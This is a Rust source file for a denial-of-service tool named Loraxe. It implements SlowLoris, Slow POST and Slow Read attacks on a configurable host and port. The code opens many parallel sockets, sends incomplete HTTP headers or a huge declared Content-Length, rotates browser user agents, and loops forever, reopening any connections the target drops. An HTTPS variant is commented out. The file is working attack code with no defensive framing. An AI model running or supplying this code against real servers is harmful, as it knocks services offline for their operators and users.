extern crate pretty_env_logger;
#[macro_use] extern crate log;

use std::error::Error;
use rayon::prelude::*;
use std::time::Duration;
// use openssl::ssl::{SslStream, SslMethod, SslConnector};
use std::net::{TcpStream, SocketAddr, ToSocketAddrs};
use std::{thread, time};
use std::io::{Read, Write};
use rand::prelude::*;

/// List of random user agents
pub const USER_AGENTS: &[&'static str]  = &[
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    &"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    &"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    &"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    &"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    &"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    ];

// pub enum SocketType {
//     Ssl(SslStream),
//     Tcp(TcpStream)
// }

#[derive(PartialEq, Debug)]
pub enum DOSType {
    SlowLoris,
    SlowPost,
    SlowRead
}

/// Config of the DOS attack
#[derive(PartialEq, Debug)]
pub struct Config {
    pub sock_timeout: Duration,
    /// https toggle
    pub https: bool,
    /// Target Address
    pub addr: String,
    /// Port to attack
    pub port: u16,
    /// Use random User agents or not
    pub rand_ua: bool,
    /// Amount of sockets to use
    pub socket_count: usize,
    /// Type of DOS to use
    pub dos_type: DOSType,
    /// Amount of time to wait in between packets
    pub delay: u64,
    /// Size of read buffer for SlowRead attack 
    pub read_size: usize
}

#[derive(PartialEq, Debug)]
pub struct Loraxe<T> {
    /// Config of this lori instance
    config: Config,
    /// Vector of connections
    connections: Vec<T>,
}

impl Loraxe<TcpStream> {
    /// Create a new lori instance
    pub fn new(config: Config) -> Self {
        // Create the lori
        Loraxe {
            connections: Vec::with_capacity(config.socket_count),
            config,
        }
    }

    /// Creates the inital sockets of the attack
    pub fn create_sockets(&mut self) -> Result<(), Box<dyn Error>> {
        info!("Creating Initial {} Sockets", self.config.socket_count);

        let mut url = self.config.addr.clone();
        url.push_str(":");
        url.push_str(&self.config.port.to_string());

        let sock_addr: SocketAddr = url.to_socket_addrs()?.collect::<Vec<SocketAddr>>()[0];

        // println!("{:?}", sock_addr);

        // Create inital scokets
        let sockets = (0..self.config.socket_count).into_par_iter().map(|i| {

            debug!("Creating Socket #{}", i);
            // Create socket
            let sock = init_socket(&self.config, &sock_addr);

            if sock.is_err(){
                trace!("Socket #{} Failed to connect",i);
                Err("Failed to connect")
            }
            else {
                Ok(sock.unwrap())
            }

        }).collect::<Vec<Result<TcpStream, &str>>>();


        let mut safe_socks = sockets.into_iter().filter(|i| i.is_ok()).map(|i| i.unwrap()).collect::<Vec<TcpStream>>();
        // Add to list
        self.connections.append(&mut safe_socks);


        Ok(())

    }

    pub fn attack(&mut self) -> Result<(), Box<dyn Error>> {

        if self.config.rand_ua {
            info!("Using random User-Agents...")
        }

        let mut rng = rand::thread_rng();

        let delay = time::Duration::from_secs(self.config.delay);

        let mut url = self.config.addr.clone();
        url.push_str(":");
        url.push_str(&self.config.port.to_string());

        let sock_addr: SocketAddr = url.to_socket_addrs()?.collect::<Vec<SocketAddr>>()[0];

        info!("Starting {:?} DOS attack on {:?} with {} sockets", self.config.dos_type, url, self.config.socket_count);

        loop {
            info!("Sending keep-alive headers... Socket Count: {}", self.connections.len());

            let max = self.connections.len() - 1;

            // self.connections = self.connections.into_par_iter().filter(|i| {

            //     true
            // }).collect();

            for i in 0..max{
                // prevent out of bounds error
                if i >= self.connections.len() {
                    break;
                }

                // Get socket reference
                let mut s = self.connections.get(i).unwrap();

                // Generate number again
                let y: u16 = rng.gen();

                // Differ packet based on attack type
                let result = match self.config.dos_type {
                    // Normal SlowLoris
                    DOSType::SlowLoris => {
                        // Write to stream
                        s.write_all(format!("X-a: {}\r\n", y).as_bytes())
                            // result = s.write_all(" ".as_bytes());
                    },
                    // Slow POST Dos
                    DOSType::SlowPost => {
                        // Post a random character
                        s.write_all(rng.gen::<char>().to_string().as_bytes())
                    }
                    DOSType::SlowRead => {
                        let mut read_buffer = Vec::with_capacity(self.config.read_size);
                        s.read(&mut read_buffer).unwrap();

                        Ok(())


                    }
                };

                // Remove if socket fails
                if result.is_err(){
                    warn!("Connection #{} Dropped", i);
                    self.connections.remove(i);
                }

            }

            trace!("Sockets: {}", self.connections.len());

            let failed_socks = self.config.socket_count - self.connections.len();


            if failed_socks > 0 {
                warn!("Failed Sockets: {}", failed_socks);

                info!("Repairing Sockets...");

                // let mut sockets = (0..(failed_socks)).into_par_iter().map(|_| {
                let sockets = (0..(failed_socks)).into_par_iter().map(|i| {

                    trace!("Recreating Socket...");

                    // Create socket
                    let sock = init_socket(&self.config, &sock_addr);

                    if sock.is_err(){
                        trace!("Socket #{} Failed to connect",i);
                        Err("Failed to connect")
                    }
                    else {
                        Ok(sock.unwrap())
                    }

                }).collect::<Vec<Result<TcpStream, &str>>>();


                let mut safe_socks = sockets.into_iter().filter(|i| i.is_ok()).map(|i| i.unwrap()).collect::<Vec<TcpStream>>();
                // Add to list
                self.connections.append(&mut safe_socks);

            }



            info!("Waiting for {} seconds", self.config.delay);

            thread::sleep(delay);

            }

        }
    }

    pub fn init_socket(config: &Config, url: &SocketAddr) -> Result<TcpStream, Box<dyn Error>>{

        // Create stream as normal
        let mut stream = TcpStream::connect_timeout(url, config.sock_timeout)?;

        let mut rng = rand::thread_rng();

        let ua: &'static str;

        if config.rand_ua {
            ua = USER_AGENTS.choose(&mut rng).unwrap();
        }
        else {
            ua = USER_AGENTS[0];
        }

        let y: u16 = rng.gen();

        let headers: String = match config.dos_type {
            // DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
            DOSType::SlowPost => format!("POST / HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 100000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n", ua),
            DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
            DOSType::SlowRead => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\n\r\n", y, ua),
        };


        trace!("Headers:\n{}", headers);

        stream.write_all(headers.as_bytes())?;

        Ok(stream)

    }

    // Create a socket with SSL
    // fn init_socket_ssl(config: &Config) -> Result<SslStream<TcpStream>, Box<dyn Error>>{
    //     // Create stream as normal
    //     let mut stream = TcpStream::connect((&config.addr[..], config.port))?;

    //     let mut rng = rand::thread_rng();

    //     let ua: &'static str;

    //     if config.rand_ua {
    //         ua = USER_AGENTS.choose(&mut rng).unwrap();
    //     }
    //     else {
    //         ua = USER_AGENTS[0];
    //     }

    //     let y: u16 = rng.gen();

    //     let headers: String = match config.dos_type {
    //         // DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
    //         DOSType::SlowPost => format!("POST / HTTP/1.1\r\nUser-Agent: {}\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 100000000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n", ua),
    //         DOSType::SlowLoris => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5", y, ua),
    //         DOSType::SlowRead => format!("GET /?{} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\n\r\n", y, ua),
    //     };


    //         // Create SSL Connector
    //         let mut connector = SslConnector::builder(SslMethod::tls()).unwrap().build();

    //         let url = String::new();

    //         url.push_str(&config.addr);
    //         url.push_str(&":");
//         url.push_str(&config.port.to_string());

//         let ssl_stream = connector.connect(&url, stream)?;

//         trace!("Headers:\n{}", headers);

//         // Send HTTP(S) request
//         ssl_stream.write_all(headers.as_bytes())?;


//         Ok(ssl_stream)
// }
